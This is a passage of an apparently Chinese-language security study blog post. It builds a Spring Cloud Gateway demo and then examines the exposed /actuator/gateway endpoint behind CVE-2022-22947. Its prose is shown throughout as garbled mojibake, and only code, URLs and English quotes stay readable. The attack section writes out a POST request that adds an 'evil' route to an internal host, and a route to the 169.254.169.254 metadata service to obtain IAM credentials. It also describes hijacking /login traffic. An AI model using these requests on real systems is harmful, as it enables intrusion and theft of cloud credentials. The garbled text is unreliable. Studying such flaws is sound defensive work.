<p> Gateway çš„ NettyRoutingFilter é€šè¿‡ HttpClient å°†è¯·æ±‚çœŸæ­£å‘åˆ°ï¼š<code>http://localhost:8081/user/info</code>ï¼›User-Service å¼€å§‹è§£æå¤„ç†ï¼š</p>
<p>åœ¨ Spring MVC çš„æ ¸å¿ƒæ§åˆ¶å™¨ï¼Œæ¥æ”¶ Gateway è½¬å‘çš„ HTTP è¯·æ±‚å¹¶åˆ†å‘ç»™å¯¹åº”çš„ Controllerã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">doDispatch(request, response);<br></code></pre></td></tr></table></figure>



<p>åœ¨<code>HandlerMapping</code>ä¸­æ ¹æ®è¯·æ±‚è·¯å¾„<code>/user/info</code>æ‰¾åˆ°å¯¹åº”çš„<code>Controller</code>æ–¹æ³•ï¼Œå»è°ƒç”¨<code>HandlerMapping.getHandler(request)</code>æ–¹æ³•ï¼Œæ‰¾åˆ°<code>UserController.getUser()</code>æ–¹æ³•è¿›è¡Œä¸‹ä¸€æ­¥å¤„ç†ã€‚</p>
<p><code>UserController.getUser()</code>æ–¹æ³•å‘¢ï¼Œä¼šè¯»å– HTTPHeader ä¸­çš„ <code>token</code>ï¼Œé€šè¿‡æ³¨è§£<code>@RequestHeadler</code>å°†è¯·æ±‚å¤´æ³¨å…¥åˆ°æ–¹æ³•å‚æ•°ä¸­</p>
<p>DispatcherServlet åº•å±‚è°ƒç”¨ <code>HttpServletRequest.getHeader(&quot;token&quot;)</code>ï¼Œè·å–è¯·æ±‚ä¸­çš„ token headerï¼Œå†å°è£…æˆ HTTP å“åº”ï¼Œè¿”å›ç»™ Gatewayï¼Œ é€šè¿‡ Gateway è®¿é—®ï¼Œ <code>UserController</code>è¿”å›ï¼š token &#x3D; abc123  </p>
<h4 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h4><p>æ€»çš„ä¸€ä¸ªæ€è·¯ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">Gateway:<br>WebHandler <span class="hljs-comment">//ï¼ˆWebFlux æ¥æ”¶ HTTP è¯·æ±‚çš„å…¥å£ã€‚</span><br>-&gt; handle <span class="hljs-comment">//è°ƒç”¨æ–¹æ³•</span><br>-&gt; handle.RoutePredicateHandlerMapping <span class="hljs-comment">// åŒ¹é…è·¯ç”± /user/**ï¼›åŒ¹é…æˆåŠŸåï¼Œè¿”å›ä¸€ä¸ª HandlerExecutionChain</span><br>-&gt; GatewayFilterChain <br>-&gt; AddRequestHeaderGatewayFilterFactory æ·»åŠ  token header<br>-&gt; NettyRoutingFilter è½¬å‘è¯·æ±‚<br>-&gt; HttpClient è°ƒç”¨ user-service <br><br>user-service:<br>DispathcherServlet<br>-&gt; HandlerMapping<br>-&gt; UserController.getUser()<br>-&gt; request.getHeader(<span class="hljs-string">&quot;token&quot;</span>)<br>-&gt; <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;UserService è¿”å›ï¼štoken = abc123&quot;</span><br></code></pre></td></tr></table></figure>



<h5 id="spring-gateway-demo"><a href="#spring-gateway-demo" class="headerlink" title="spring-gateway-demo"></a>spring-gateway-demo</h5><p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml">	<span class="hljs-comment">&lt;!-- Spring Cloud Gateway --&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>	<br>	<span class="hljs-comment">&lt;!-- Actuatorï¼ˆå¯çœ‹è·¯ç”±ã€è°ƒè¯•ï¼‰ --&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>application.yml</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># åº”ç”¨æœåŠ¡ WEB è®¿é—®ç«¯å£</span><br><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">9000</span><br><br><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">gateway:</span><br>      <span class="hljs-comment">#é…ç½®è·¯ç”±è¡¨ï¼ˆå¯ä»¥æœ‰å¤šä¸ªè·¯ç”±ï¼‰</span><br>      <span class="hljs-attr">routes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">user-service</span><br>          <span class="hljs-comment">#æŒ‡å®šè¯¥è·¯ç”±çš„ç›®æ ‡æœåŠ¡å™¨åœ°å€ï¼Œè·¯å¾„åŒ¹é…æ—¶ï¼ŒGatewayä¼šå°†è¯·æ±‚è½¬å‘åˆ° user-service</span><br>          <span class="hljs-attr">uri:</span> <span class="hljs-string">http://localhost:8081</span><br>          <span class="hljs-comment">#è·¯ç”±æ–­è¨€ï¼Œåˆ¤æ–­ä»€ä¹ˆè¯·æ±‚èƒ½åŒ¹é…åˆ°è¿™ä¸€æ¡è·¯ç”±ï¼Œè¿™é‡Œçš„æ„æ€æ˜¯ï¼šåªè¦è·¯å¾„ä»¥ /user/ å¼€å¤´ï¼Œéƒ½ç”± Gateway è½¬å‘åˆ° 8081</span><br>          <span class="hljs-attr">predicates:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/user/**</span><br>          <span class="hljs-comment">#é…ç½®è¿‡æ»¤å™¨ï¼ŒåŠŸèƒ½ï¼šåœ¨è½¬å‘å‰è‡ªåŠ¨ä¸ºè¯·æ±‚æ·»åŠ ä¸€ä¸ª Header</span><br>          <span class="hljs-attr">filters:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">AddRequestHeader=token,</span> <span class="hljs-string">abc123</span><br></code></pre></td></tr></table></figure>

<p>GatewayApplication.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springgatewaydemo;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GatewayApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(GatewayApplication.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>



<h5 id="user-service"><a href="#user-service" class="headerlink" title="user-service"></a>user-service</h5><p>UserController.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.userservice.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestHeader;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br><br>    <span class="hljs-comment">//ä½¿ç”¨ @RequestHeader ä» HTTP è¯·æ±‚å¤´ä¸­è¯»å– tokenï¼Œå¦‚æœè¯·æ±‚æ¥è‡ª Gateway åˆ™æ·»åŠ  header -&gt; token = abc123</span><br>    <span class="hljs-meta">@GetMapping(&quot;/user/info&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@RequestHeader(value = &quot;token&quot;, required = false)</span> String token)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;UserService è¿”å›ï¼štoken = &quot;</span> + token;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>application.yml</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8081</span><br></code></pre></td></tr></table></figure>

<p>UserServiceApplication.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.userservice;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(UserServiceApplication.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>





<p>å…ˆè¿è¡Œ UserServiceï¼Œå†è¿è¡Œ Gatewayï¼Œé€šè¿‡è®¿é—® <a target="_blank" rel="noopener" href="http://127.0.0.1:9000/user/info">http://127.0.0.1:9000/user/info</a> è¿”å› tokenï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054785.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272056114.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>è¿™æ ·å°±è¾¾åˆ°äº†æˆ‘ä»¬çš„é¢„æœŸç»“æœï¼š</p>
<ol>
<li><strong>è®¿é—® Gateway (</strong><code>**9000**</code><strong>)</strong></li>
</ol>
<ul>
<li>Gateway ä¼šè‡ªåŠ¨åŠ ä¸Š <code>token=abc123</code></li>
<li>è½¬å‘ç»™ user-service</li>
<li>user-service æ”¶åˆ° header â†’ è¾“å‡º <code>token = abc123</code></li>
</ul>
<ol start="2">
<li><strong>ç›´æ¥è®¿é—® user-service (</strong><code>**8081**</code><strong>)</strong></li>
</ol>
<ul>
<li>è¯·æ±‚ä¸­æ²¡æœ‰ header</li>
<li>user-service è¯»åˆ° <code>null</code> â†’ è¾“å‡º <code>token = null</code></li>
</ul>
<h2 id="1-2-actuator-gateway"><a href="#1-2-actuator-gateway" class="headerlink" title="1.2 &#x2F;actuator&#x2F;gateway"></a>1.2 &#x2F;actuator&#x2F;gateway</h2><p>æœ¬æ–‡å€Ÿç”¨ <a target="_blank" rel="noopener" href="https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/">Bring Your Own SSRF â€“ The Gateway Actuator</a> ä¸€æ–‡ä¸­çš„é¡¹ç›®<a target="_blank" rel="noopener" href="https://github.com/wdahlenburg/spring-gateway-demo?tab=readme-ov-file">https://github.com/wdahlenburg/spring-gateway-demo?tab=readme-ov-file</a> è¿›è¡Œå­¦ä¹ </p>
<p>å½“æˆ‘ä»¬è®¿é—® &#x2F;actuator&#x2F;gateway æ—¶å‡ºç° 404 é”™è¯¯ï¼Œè€Œæ­£å¸¸æƒ…å†µï¼Œå¤§å¤šæ•°æ‰§è¡Œå™¨åœ¨æ”¶åˆ° GET è¯·æ±‚åéƒ½ä¼šæ˜¾ç¤ºå…¶é»˜è®¤å†…å®¹ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272056847.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æŸ¥çœ‹æ–‡æ¡£ï¼š <a target="_blank" rel="noopener" href="https://cloud.spring.io/spring-cloud-gateway/reference/html/#recap-the-list-of-all-endpoints">https://cloud.spring.io/spring-cloud-gateway/reference/html/#recap-the-list-of-all-endpoints</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054128.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼ŒSpring Cloud Gateway æ˜¯æ²¡æœ‰<code> /actuator/gateway</code> è¿™ä¸ªç«¯ç‚¹çš„ï¼Œéƒ½æ˜¯ä»¥<code>/actuator/gateway/***</code> å¼€å¤´çš„å­è·¯å¾„  </p>
<p>æ¥ç€è®¿é—®<code>/actuator/gateway/routes</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272056999.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>åˆ†æè¿”å›å†…å®¹ï¼š</p>
<p>JSON ä¸­åŒ…å«ä¿©ä¸ªè·¯ç”±é…ç½®ï¼š</p>
<p>route_id &#x3D; test</p>
<p>route_id &#x3D; get</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html">[<br>  &#123;<br>    <span class="hljs-comment">&lt;!--æ–­è¨€ï¼š/test/**;&#x27;match trailing slash: true&#x27; è¡¨ç¤º /test/abc/ä¹Ÿä¼šåŒ¹é… /test/abcä¹ŸåŒ¹é…--&gt;</span><br>    &quot;predicate&quot;: &quot;Paths: [/test/**], match trailing slash: true&quot;,<br>    &quot;route_id&quot;: &quot;test&quot;,<br>    <span class="hljs-comment">&lt;!--æ˜¾ç¤ºäº† Gateway è‡ªåŠ¨è§£æåçš„è¿‡æ»¤å™¨ï¼ŒRewritePath è¿‡æ»¤å™¨  --&gt;</span><br>    <span class="hljs-comment">&lt;!--è·¯å¾„é‡å†™è§„åˆ™ï¼šåŒ¹é…ä»¥ /test å¼€å¤´çš„è·¯å¾„ï¼Œç”¨æ­£åˆ™æ•è· /test åé¢çš„æ‰€æœ‰å†…å®¹ä¸º pathï¼Œæœ€ç»ˆè·¯å¾„å˜æˆï¼š/test/aaa/bbb æ”¹ä¸º /aaa/bbb --&gt;</span><br>    &quot;filters&quot;: [&quot;[[RewritePath /test(?<span class="hljs-tag">&lt;<span class="hljs-name">path</span>&gt;</span>.*) = &#x27;/$&#123;path&#125;&#x27;], order = 0]&quot;],<br>    <span class="hljs-comment">&lt;!--è¯·æ±‚ä¼šè¢«ä»£ç†åˆ° Googleï¼Œå¼ºåˆ¶ä½¿ç”¨ httpsï¼ˆ443ï¼‰  --&gt;</span><br>    &quot;uri&quot;: &quot;https://www.google.com:443&quot;,<br>    <span class="hljs-comment">&lt;!--è·¯ç”±åŒ¹é…é¡ºåºï¼Œé»˜è®¤éƒ½æ˜¯ 0  --&gt;</span><br>    &quot;order&quot;: 0<br>  &#125;,<br>  &#123;<br>    <span class="hljs-comment">&lt;!--æ–­è¨€ï¼š/get/**  --&gt;</span><br>    &quot;predicate&quot;: &quot;Paths: [/get/**], match trailing slash: true&quot;,<br>    &quot;route_id&quot;: &quot;get&quot;,<br>    <span class="hljs-comment">&lt;!--AddRequestHeader è¿‡æ»¤å™¨ï¼Œæ‰€æœ‰è½¬å‘åˆ° httpbin.org çš„è¯·æ±‚ï¼Œéƒ½ä¼šè‡ªåŠ¨åŠ ä¸€ä¸ªè¯·æ±‚å¤´ï¼šX-Gateway-Test: Foo  --&gt;</span><br>    &quot;filters&quot;: [&quot;[[AddRequestHeader X-Gateway-Test = &#x27;Foo&#x27;], order = 0]&quot;],<br>    &quot;uri&quot;: &quot;https://httpbin.org:443&quot;,<br>    &quot;order&quot;: 0<br>  &#125;<br>]<br></code></pre></td></tr></table></figure>



<p>æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“å½“è¯·æ±‚<code>/get/**</code>æ—¶ï¼ŒGateway ä¼šæŠŠè¯·æ±‚å‘é€åˆ°<code>http://httpbin.org/get</code>ï¼›</p>
<p>è€Œæˆ‘ä»¬é€šè¿‡ Actuator æŸ¥çœ‹è·¯ç”±ï¼Œå¯ä»¥å‘ç°<strong>éšè—çš„ã€å¯èƒ½æš´éœ²å†…éƒ¨ç³»ç»Ÿçš„ä»£ç†</strong>çš„è·¯ç”±ï¼Œè¿™å¯èƒ½å­˜åœ¨å®‰å…¨é£é™©ã€‚è€Œ CVE-2022-22947 æ­£æ˜¯ Gateway è¢«åˆ©ç”¨ â€”â€” å¯ä»¥å‘é€ SSRF è¯·æ±‚ã€‚</p>
<h2 id="1-3-æ·»åŠ è·¯ç”±"><a href="#1-3-æ·»åŠ è·¯ç”±" class="headerlink" title="1.3 æ·»åŠ è·¯ç”±"></a>1.3 æ·»åŠ è·¯ç”±</h2><h3 id="1-3-1"><a href="#1-3-1" class="headerlink" title="1.3.1"></a>1.3.1</h3><blockquote>
<p> Actuators are primarily intended to provide administrative functionality, so of course the gateway actuator allows you to add and delete routes. As a note, all sensitive actuators should be behind administrative authentication or disabled.  </p>
</blockquote>
<p>Actuator æœ¬æ¥å°±æä¾›ç®¡ç†åŠŸèƒ½ï¼Œå¯ä»¥æŸ¥çœ‹ã€ä¿®æ”¹ã€åˆ·æ–°ç³»ç»ŸçŠ¶æ€ï¼ŒSpring Cloud Gateway çš„ actuator å¯ä»¥æ·»åŠ å’Œåˆ é™¤è·¯ç”±ã€‚å¦‚æœæ²¡æœ‰å¯¹æ­¤é¡¹åŠŸèƒ½è¿›è¡Œä¿æŠ¤ï¼Œå°±ä¼šäº§ç”Ÿæ¼æ´</p>
<blockquote>
<p>As an attacker what would it look like if you could add a route to a running application? Well you could route to internal applications. You could route to cloud metadata services and try to obtain credentials. You could re-route active paths on the app to a server you control to obtain cookies, tokens, etc. All of these are possible with the gateway actuator.</p>
</blockquote>
<p>å¦‚æœä¸€ä¸ªæ”»å‡»è€…å¯ä»¥è‡ªç”±æ·»åŠ è·¯ç”±ï¼Œé‚£ä¹ˆä»–èƒ½åšä»€ä¹ˆï¼Ÿ</p>
<ol>
<li><strong>è·¯ç”±åˆ°å†…éƒ¨æœåŠ¡ï¼ˆå†…ç½‘ï¼‰</strong></li>
</ol>
<p>æ·»åŠ ä»¥ä¸‹è·¯ç”±ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/routes/evil<br>&#123;<br>  &quot;id&quot;: &quot;evil&quot;,<br>  &quot;uri&quot;: &quot;http://10.0.0.5:8080&quot;,<br>  &quot;predicates&quot;: [&#123;<br>    &quot;name&quot;: &quot;Path&quot;,<br>    &quot;args&quot;: &#123; &quot;pattern&quot;: &quot;/attack/**&quot; &#125;<br>  &#125;]<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è®¿é—® &#x2F;attack&#x2F;** å°±èƒ½è®¿é—®æœ¬æ¥ä¸èƒ½è®¿é—®çš„å†…ç½‘ï¼š<a target="_blank" rel="noopener" href="http://10.0.0.1:8080/admin%EF%BC%8C**SSRF">http://10.0.0.1:8080/adminï¼Œ**SSRF</a> å‡çº§ä¸ºå†…ç½‘ç©¿é€**ã€‚  </p>
<ol>
<li><strong>è®¿é—®äº‘ç¯å¢ƒçš„ Metadata Service ï¼Œçªƒå–äº‘å‡­è¯</strong></li>
</ol>
<p> Metadata Service å…ƒæ•°æ®æœåŠ¡ï¼Œ æ˜¯ä¸€ä¸ªæœ¬åœ°ä¼ªè£…çš„ HTTP æœåŠ¡ï¼Œå®ƒ<strong>ä¸åœ¨ç½‘ç»œé‡Œ</strong>ï¼Œä½†æ˜¯åªèƒ½è¢«è™šæœºæœ¬èº«è®¿é—®ã€‚ä¾‹å¦‚ï¼š169.254.169.254ï¼Œ è¿™æ˜¯å…¨çƒäº‘é€šç”¨çš„ Metadata åœ°å€ã€‚</p>
<p>å…ƒæ•°æ®æœåŠ¡ä½œç”¨ï¼š</p>
<ul>
<li>æä¾›å½“å‰æœºå™¨æ˜¯ä»€ä¹ˆå®ä¾‹ç±»å‹ã€æ‰€åœ¨åŒºåŸŸã€ä¸»æœºåã€å…¬ç½‘ç§ç½‘ IP ä»¥åŠåˆ†é…ç»™è¯¥äº‘ä¸»æœºçš„ IAM æƒé™ä¸´æ—¶å¯†é’¥</li>
</ul>
<p>åœ¨äº‘ç¯å¢ƒä¸­ï¼ŒæœåŠ¡å™¨æœ¬èº«æ€»æ˜¯èƒ½è®¿é—® metadataï¼Œé€šè¿‡ SSRF å°±å¯ä»¥æ”¾æœåŠ¡å™¨è®¿é—®<code>http://169.254.169.254/latest/meta-data/iam/security-credentials</code> ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸¥é‡æ¼æ´</p>
<p>æ”»å‡»è€…æ·»åŠ è·¯ç”±ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">uri: http://169.254.169.254/latest/meta-data/<br></code></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">/aws-keys/iam/security-credentials<br></code></pre></td></tr></table></figure>

<p>å³å¯è·å– AWSï¼ˆäº‘å‚å•†ï¼‰ IAM ä¸´æ—¶å¯†é’¥ â€”â€” ç›¸å½“äºç¬é—´æ‹¿ä¸‹æœåŠ¡å™¨æƒé™ã€‚</p>
<p>è¿™æ˜¯äº‘ç¯å¢ƒæœ€è‡´å‘½çš„é£é™©ä¹‹ä¸€ã€‚</p>
<ol>
<li><strong>åŠ«æŒè·¯ç”±ï¼ŒæŠŠç”¨æˆ·æµé‡è½¬å‘æ”»å‡»è€…æœåŠ¡å™¨</strong></li>
</ol>
<p>æ¯”å¦‚ä¿®æ”¹ <code>/login</code>-&gt;æ”»å‡»è€…æœåŠ¡å™¨ï¼Œå°±å¯ä»¥åŠ«æŒç”¨æˆ·ä¿¡æ¯ç­‰ã€‚</p>
<p>è¿™ç›¸å½“äºæ”»å‡»è€…æ§åˆ¶äº†æ•´ä¸ªåç«¯ç³»ç»Ÿçš„è®¿é—®æµé‡ã€‚</p>
<p>*<strong>å½“ç„¶ä»¥ä¸Šæ¨æµ‹çš„å‰ææ˜¯ Actutor Gateway è·¯ç”±ç«¯ç‚¹å¯¹å¤–å¯è®¿é—®ä¸”æ²¡æœ‰å¯ç”¨å®‰å…¨ä¿æŠ¤æªæ–½ã€‚*</strong></p>
<blockquote>
<p>From reviewing the <a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-gateway-server/2.2.10.RELEASE">spring-cloud-gateway-server-2.2.10.RELEASE.jar</a> I was able to see that <strong>valid routes can be resolved with the http&#x2F;https, ws&#x2F;wss, lb, and forward URI schemes.</strong> The first two, http&#x2F;https, enable http requests to be routed. The ws&#x2F;wss schemes allow for a websocket route to be created. The lb scheme stands for load balancer, which usually are going to be predefined hosts that can be addressed in a route. Finally the forward scheme appears to be used as way of performing a redirect without forcing the client to handle the 301&#x2F;302 redirect. All other schemes donâ€™t currently resolve unless an extension is added to support additional schemes.</p>
</blockquote>
<p>ä½œè€…é€šè¿‡æŸ¥çœ‹ spring-cloud-gateway-server-2.2.10.RELEASE.jar æ–‡ä»¶ï¼Œäº†è§£åˆ°æœ‰æ•ˆçš„è·¯ç”±å¯ä»¥é€šè¿‡ http&#x2F;httpsã€ws&#x2F;wssã€lb å’Œ forward URI æ–¹æ¡ˆè¿›è¡Œè§£æ</p>
